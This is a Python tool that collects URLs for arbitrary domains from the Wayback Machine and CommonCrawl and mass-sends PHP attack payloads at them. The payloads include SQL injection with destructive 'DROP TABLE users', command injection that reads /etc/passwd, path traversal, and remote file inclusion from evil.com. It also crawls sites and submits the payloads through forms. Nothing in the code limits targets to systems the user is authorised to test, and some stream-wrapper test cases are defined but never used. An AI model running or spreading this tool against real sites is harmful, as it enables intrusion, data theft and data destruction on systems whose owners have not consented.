import requests
import sqlite3
import argparse
import datetime
import logging
import html
from waybackpy import WaybackMachineCDXServerAPI
from bs4 import BeautifulSoup
from multiprocessing import Pool, cpu_count
import concurrent.futures
import urllib.parse
import os
from termcolor import colored

# Configure logging
log_file = 'phpscan.log'
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logging.getLogger().addHandler(console_handler)

# Custom logging function to include color
def log_with_color(level, message, color=None):
    if color:
        message = colored(message, color)
    if level == "info":
        logging.info(message)
    elif level == "debug":
        logging.debug(message)
    elif level == "error":
        logging.error(message)

# Database setup
def setup_database(db_name):
    conn = sqlite3.connect(db_name)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS urls (
            id INTEGER PRIMARY KEY, 
            url TEXT UNIQUE
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS responses (
            id INTEGER PRIMARY KEY, 
            url TEXT, 
            payload TEXT, 
            response TEXT, 
            timestamp TEXT,
            status TEXT
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS vulnerabilities (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT,
            parameter TEXT,
            result TEXT,
            request TEXT,
            response TEXT
        )
    ''')
    conn.commit()
    return conn, c

# Extract URLs from Wayback Machine
def extract_wayback_urls(domain):
    wayback = WaybackMachineCDXServerAPI(domain)
    urls = []
    for snapshot in wayback.snapshots():
        try:
            urls.append(snapshot.original)
        except AttributeError:
            continue
    log_with_color("info", f"Extracted {len(urls)} URLs from Wayback Machine for {domain}.", "cyan")
    return urls

# Extract URLs from CommonCrawl
def extract_commoncrawl_urls(domain):
    index_url = f"https://index.commoncrawl.org/CC-MAIN-2024-30-index?url={domain}&output=json"
    response = requests.get(index_url)
    if response.status_code == 200:
        try:
            data = response.json()
            if isinstance(data, list):
                urls = [entry['url'] for entry in data]
            elif isinstance(data, dict):
                urls = [data['url']]
            log_with_color("info", f"Extracted {len(urls)} URLs from CommonCrawl for {domain}.", "cyan")
            return urls
        except ValueError as e:
            log_with_color("error", f"Error parsing JSON: {e}", "red")
            log_with_color("error", f"Response content: {response.content}", "red")
            return []
    else:
        log_with_color("error", f"Error fetching CommonCrawl data: {response.status_code}", "red")
    return []

# Filter and save relevant URLs to database
def save_urls_to_db(urls, cursor, conn):
    relevant_urls = [url for url in urls if ".php" in url or ("?" in url and "=" in url) or not url.endswith("/") and not url.endswith(".html") and not url.endswith(".htm")]
    for url in relevant_urls:
        try:
            cursor.execute("INSERT OR IGNORE INTO urls (url) VALUES (?)", (url,))
        except sqlite3.IntegrityError:
            continue
    conn.commit()
    log_with_color("info", f"Saved {len(relevant_urls)} relevant URLs to the database.", "cyan")

# PHP Payloads
payloads = [
    # Simple payloads
    "?id=1", "?page=../../../../etc/passwd", "?cmd=echo 'Hello, World!'",
    # Advanced payloads
    "?cmd=system('ls')", "?cmd=exec('cat /etc/passwd')", "?cmd=phpinfo()", "?id=1 UNION SELECT 1,2,3 --",
    "?id=1; DROP TABLE users --", "?id=1 AND 1=1", "?id=1 AND 1=2", "?id=1 OR 1=1", "?id=1 OR 1=2",
    "?cmd=popen('ls -la')", "?cmd=passthru('id')", "?cmd=shell_exec('cat /etc/issue')",
    # Obfuscated payloads
    "?cmd=sy\u0073tem('ls')", "?cmd=e\u0078ec('cat /etc/passwd')", "?cmd=p\u0068pinfo()",
    "?id=1%3b DROP TABLE users --", "?id=1%3b SELECT * FROM information_schema.tables --",
    "?id=1/*!50000AND*/1=1", "?id=1/*!50000AND*/1=2", "?id=1/*!50000OR*/1=1", "?id=1/*!50000OR*/1=2",
    "?cmd=c\u0068dir('/etc')", "?cmd=sy\u0073tem('u\u006eame -a')", "?cmd=e\u0078ec('whoami')",
    # More advanced and obfuscated payloads
    "?id=1%27%20AND%201=1--", "?id=1%27%20AND%201=2--", "?id=1%27%20OR%201=1--", "?id=1%27%20OR%201=2--",
    "?id=1%20AND%20(SELECT%201%20FROM%20(SELECT%20COUNT(*),CONCAT((SELECT%20(SELECT%20CONCAT(CAST(DATABASE()%20AS%20CHAR),0x7e,FLOOR(RAND(0)*2)))x)%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)%20LIMIT%201)--%20",
    "?id=1%20AND%20EXTRACTVALUE(1,CONCAT(0x5c,(SELECT%20MID((IFNULL(CAST(DATABASE()%20AS%20CHAR),0x20)),1,50))))",
    "?id=1%20AND%20MID((SELECT%20IFNULL(CAST(CURRENT_USER()%20AS%20CHAR),0x20)),1,50)",
    "?id=1%27%20UNION%20SELECT%20NULL,NULL,NULL%20--", "?id=1%27%20UNION%20SELECT%201,@@version,NULL%20--",
    "?id=1%27%20AND%201=1%20UNION%20ALL%20SELECT%201,2,3--%20",
    "?id=1%27%20AND%201=1%20UNION%20ALL%20SELECT%201,version(),3--%20",
    "?id=1%20AND%201=1%20UNION%20ALL%20SELECT%201,table_name,3%20FROM%20information_schema.tables--",
    "?id=1%27%20AND%201=2%20UNION%20ALL%20SELECT%201,schema_name,3%20FROM%20information_schema.schemata--",
    "?id=1%20AND%20(SELECT%20table_name%20FROM%20information_schema.tables%20LIMIT%201)=1",
    "?id=1%20AND%20(SELECT%20schema_name%20FROM%20information_schema.schemata%20LIMIT%201)=1",
    "?id=1%27%20AND%201=1--%20AND%20sleep(5)--", "?id=1%27%20OR%20SLEEP(5)--",
    "?id=1%27%20AND%201=1--%20AND%20BENCHMARK(1000000,MD5(1))--", "?id=1%27%20OR%20BENCHMARK(1000000,MD5(1))--",
    "?id=1%27%20AND%201=1--%20AND%20RAND(0)*SLEEP(5)--", "?id=1%27%20OR%20RAND(0)*SLEEP(5)--",
    "?id=1%27%20AND%201=1--%20AND%20IFNULL(1,2)=2--", "?id=1%27%20OR%20IFNULL(1,2)=2--",
    "?id=1%27%20AND%201=1--%20AND%20EXTRACTVALUE(1,0x5c)--", "?id=1%27%20OR%20EXTRACTVALUE(1,0x5c)--",
    # Commix payloads and additional advanced payloads
    "?cmd=system('id')", "?cmd=system('uname -a')", "?cmd=system('cat /etc/issue')", "?cmd=exec('id')",
    "?cmd=exec('uname -a')", "?cmd=exec('cat /etc/issue')", "?cmd=passthru('id')", "?cmd=passthru('uname -a')",
    "?cmd=passthru('cat /etc/issue')", "?cmd=shell_exec('id')", "?cmd=shell_exec('uname -a')", "?cmd=shell_exec('cat /etc/issue')",
    "?id=1 OR 1=1--", "?id=1; DROP TABLE users--", "?id=1' UNION SELECT 1, version()--", "?id=1' AND '1'='1'--",
    "?id=1' AND '1'='2'--", "?id=1' OR '1'='1'--", "?id=1' OR '1'='2'--", "?id=1 AND 1=1", "?id=1 AND 1=2",
    "?id=1 OR 1=1", "?id=1 OR 1=2", "?id=1;--", "?id=1/*", "?id=1--", "?id=1#", "?id=1%00", "?id=1%20--", "?id=1%23",
    # Additional payloads to get /etc/passwd
    "?file=../../../../etc/passwd", "?path=../../../../etc/passwd"
]

# Stream wrappers and test cases
stream_wrappers = [
    "file://", "http://", "https://", "ftp://", "php://input", "data://", "zip://", "gopher://", "expect://", "phar://", "glob://", "ssh2://"
]

test_cases = {
    "file://": [
        "/etc/passwd", "/etc/hostname", "/etc/hosts", "../../../index.php", "php://filter/convert.base64-encode/resource=index.php",
    ],
    "http://": [
        "http://evil.com/malicious_script.php", "http://example.com",
    ],
    "https://": [
        "https://evil.com/malicious_script.php", "https://example.com",
    ],
    "ftp://": [
        "ftp://evil.com/malicious_script.php",
    ],
    "php://input": [
        "<?php echo 'Hello, I am PHP code!';", "<?php system('ls');", "",
    ],
    "data://": [
        "text/plain,Hello%20World", "application/x-php,<?php phpinfo(); ?>",
    ],
    "zip://": [
        "zip://archive.zip#file.txt",
    ],
    "gopher://": [
        "gopher://evil.com/1/_GET%20HTTP/1.0%0D%0AHost:%20evil.com%0D%0A%0D%0A",
    ],
    "expect://": [
        "expect://id", "expect://uname -a", "expect://cat /etc/passwd",
    ],
    "phar://": [
        "phar://path/to/malicious.phar/file.txt", "phar://path/to/malicious.phar/index.php",
    ],
    "glob://": [
        "glob://*.php", "glob://../../*.php",
    ],
    "ssh2://": [
        "ssh2://user:password@evil.com:22",
    ]
}

# Function to fetch and parse a URL
def fetch_and_parse_url(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        if response.status_code == 200:
            content = response.text
            soup = BeautifulSoup(content, 'html.parser')
            return soup
    except requests.exceptions.RequestException as e:
        log_with_color("error", f"Error fetching {url}: {e}", "red")
    return None

# Function to test forms on a page
def test_forms(url, soup):
    forms = soup.find_all('form')
    
    for form in forms:
        action = form.get('action')
        method = form.get('method')

        log_with_color("info", f"Form found at URL: {url}", "yellow")
        log_with_color("info", f"Action: {action}", "yellow")
        log_with_color("info", f"Method: {method}", "yellow")
        log_with_color("info", "Fields:", "yellow")
        
        input_fields = form.find_all('input')
        for field in input_fields:
            name = field.get('name')
            field_type = field.get('type')
            log_with_color("info", f"Name: {name}, Type: {field_type}", "yellow")

        # Test form for vulnerabilities by submitting payloads
        for payload in payloads:
            test_url = urllib.parse.urljoin(url, action)
            test_url = f"{test_url}&{payload}"
            log_with_color("info", f"Testing form at {test_url}", "cyan")
            if test_php_injection_vulnerabilities(test_url, payload):
                log_with_color("info", f"PHP Injection Vulnerability Found in Form: {test_url}", "red")

        log_with_color("info", "\n", "yellow")

# Custom PHP injection vulnerability testing logic
def test_php_injection_vulnerabilities(url, payload):
    try:
        response = requests.get(url)
        if is_vulnerable(response.text):
            log_vulnerability(url, payload, response.text)
            return True  # PHP injection vulnerability found
        else:
            return False  # No PHP injection vulnerability found

    except Exception as e:
        log_with_color("error", f"Error testing PHP injection: {e}", "red")
        return False

# Function to log vulnerabilities
def log_vulnerability(url, payload, response_text):
    timestamp = datetime.datetime.now().isoformat()
    log_msg = colored(f"PHP Injection Vulnerability Found: {url}", "red")
    logging.info(log_msg)
    print(log_msg)

    log_msg = colored(f"Payload: {payload}", "yellow")
    logging.info(log_msg)
    print(log_msg)

    log_msg = colored(f"Response: {response_text}", "cyan")
    logging.info(log_msg)
    print(log_msg)

# Function to send a payload and log response
def send_payload(args):
    url, payload, headers = args
    timestamp = datetime.datetime.now().isoformat()
    try:
        response = requests.get(url + payload, headers=headers)
        vulnerable = is_vulnerable(response.text)
        status = "Vulnerable" if vulnerable else "Secure"
        color = "red" if vulnerable else "green"
        log_with_color("info", f"Tested {url + payload} - Status: {status}", color)
        return (url, payload, f"{status}\n\n{response.text}", timestamp, status)
    except requests.exceptions.RequestException as e:
        log_with_color("error", f"Error sending payload to {url + payload}: {e}", "red")
        return (url, payload, str(e), timestamp, "Error")

# Send PHP payloads and log responses with multiprocessing
def send_php_payloads(cursor, conn):
    urls = cursor.execute("SELECT url FROM urls").fetchall()
    headers = {"User-Agent": "Mozilla/5.0"}
    pool = Pool(cpu_count())

    tasks = [(clean_url(url[0]), payload, headers) for url in urls for payload in payloads]
    results = pool.map(send_payload, tasks)

    pool.close()
    pool.join()

    for result in results:
        cursor.execute("INSERT INTO responses (url, payload, response, timestamp, status) VALUES (?, ?, ?, ?, ?)", result)
    conn.commit()

    return results

# Clean URL function to remove Wayback Machine prefix
def clean_url(url):
    if "web.archive.org" in url:
        original_url_start = url.find("http", 20)
        if (original_url_start != -1):
            url = url[original_url_start:]
    return url

# Check if response indicates vulnerability
def is_vulnerable(response):
    indicators = ['root:', 'password', 'shadow', 'bin/bash', 'uid=', 'gid=', 'etc/passwd', 'etc/shadow', 'private']
    return any(indicator in response for indicator in indicators)

# Function to crawl a page, test for PHP injection vulnerabilities, and submit forms
def crawl_and_test_page(url, visited_pages, crawled_pages, max_pages):
    if url not in crawled_pages and len(crawled_pages) < max_pages:
        log_with_color("info", f"Crawling: {url}", "blue")
        soup = fetch_and_parse_url(url)
        if soup:
            crawled_pages.add(url)
            for link in soup.find_all('a'):
                next_url = link.get('href')
                if next_url and (next_url.startswith(args.start_url) or "?" in next_url or "=" in next_url or next_url.endswith(".php")):
                    next_url = urllib.parse.urljoin(args.start_url, next_url)
                    if next_url not in visited_pages:
                        visited_pages.add(next_url)
                        crawl_and_test_page(next_url, visited_pages, crawled_pages, max_pages)
            if test_php_injection_vulnerabilities(url, ""):
                log_with_color("info", f"PHP Injection Vulnerability Found: {url}", "red")
            
            test_forms(url, soup)

# Generate HTML report
def generate_html_report(cursor, report_filename, vulnerabilities_only=False):
    if vulnerabilities_only:
        cursor.execute("SELECT * FROM responses WHERE response LIKE '%Vulnerable%'")
    else:
        cursor.execute("SELECT * FROM responses")
    responses = cursor.fetchall()

    html_content = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>PHP Vulnerability Scan Report</title>
        <style>
            table {
                width: 100%;
                border-collapse: collapse;
            }
            table, th, td {
                border: 1px solid black;
            }
            th, td {
                padding: 8px;
                text-align: left;
            }
            th {
                background-color: #f2f2f2;
            }
            .vulnerable {
                background-color: #f8d7da;
            }
            .secure {
                background-color: #d4edda;
            }
            pre {
                white-space: pre-wrap; /* CSS3 */
                white-space: -moz-pre-wrap; /* Mozilla, since 1999 */
                white-space: -pre-wrap; /* Opera 4-6 */
                white-space: -o-pre-wrap; /* Opera 7 */
                word-wrap: break-word; /* Internet Explorer 5.5+ */
            }
        </style>
    </head>
    <body>
        <h1>PHP Vulnerability Scan Report</h1>
        <table>
            <tr>
                <th>URL</th>
                <th>Payload</th>
                <th>Response</th>
                <th>Timestamp</th>
                <th>Status</th>
            </tr>
    """

    for response in responses:
        status_class = "vulnerable" if "Vulnerable" in response[3] else "secure"
        html_content += f"""
        <tr class="{status_class}">
            <td>{html.escape(response[1])}</td>
            <td><pre>{html.escape(response[2])}</pre></td>
            <td><pre>{html.escape(response[3])}</pre></td>
            <td>{html.escape(response[4])}</td>
            <td>{'Vulnerable' if 'Vulnerable' in response[3] else 'Secure'}</td>
        </tr>
        """

    html_content += """
        </table>
    </body>
    </html>
    """

    with open(report_filename, "w") as report_file:
        report_file.write(html_content)
    log_with_color("info", f"HTML report generated: {report_filename}", "cyan")

# Load domains from a file
def load_domains_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            domains = [line.strip() for line in file.readlines()]
        return domains
    except Exception as e:
        log_with_color("error", f"Error loading domains from {file_path}: {e}", "red")
        return []

# Command-line interface
def main():
    global visited_pages, crawled_pages, max_pages, args
    parser = argparse.ArgumentParser(description="Advanced Web Crawler and PHP Injection Vulnerability Testing")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--start-url', type=str, help='Starting URL for crawling')
    group.add_argument('-d', '--domains-file', type=str, help='File containing list of domains to test')
    parser.add_argument('-db', '--database', default='php_vulnerability_test.db', help='SQLite database file name')
    parser.add_argument('-r', '--report', action='store_true', help='Generate report')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')

    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
        console_handler.setLevel(logging.DEBUG)

    conn, cursor = setup_database(args.database)

    domains = []
    if args.start_url:
        domains.append(args.start_url)
    if args.domains_file:
        domains.extend(load_domains_from_file(args.domains_file))

    for domain in domains:
        log_with_color("info", f"Starting URL extraction for domain: {domain}", "blue")
        wayback_urls = extract_wayback_urls(domain)
        commoncrawl_urls = extract_commoncrawl_urls(domain)

        all_urls = set(wayback_urls + commoncrawl_urls)
        save_urls_to_db(all_urls, cursor, conn)
        
        log_with_color("info", "Sending PHP payloads to extracted URLs.", "blue")
        send_php_payloads(cursor, conn)

    visited_pages = set()
    crawled_pages = set()
    max_pages = 1000

    for domain in domains:
        visited_pages.add(domain)
        # Create a thread pool for crawling and vulnerability testing
        with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
            executor.submit(crawl_and_test_page, domain, visited_pages, crawled_pages, max_pages)

    if args.report:
        generate_html_report(cursor, "full_run_php_vulnerability_report.html", vulnerabilities_only=False)
        generate_html_report(cursor, "found_vulnerability_php_report.html", vulnerabilities_only=True)

    conn.close()
    log_with_color("info", "Completed all tasks.", "green")

if __name__ == '__main__':
    main()
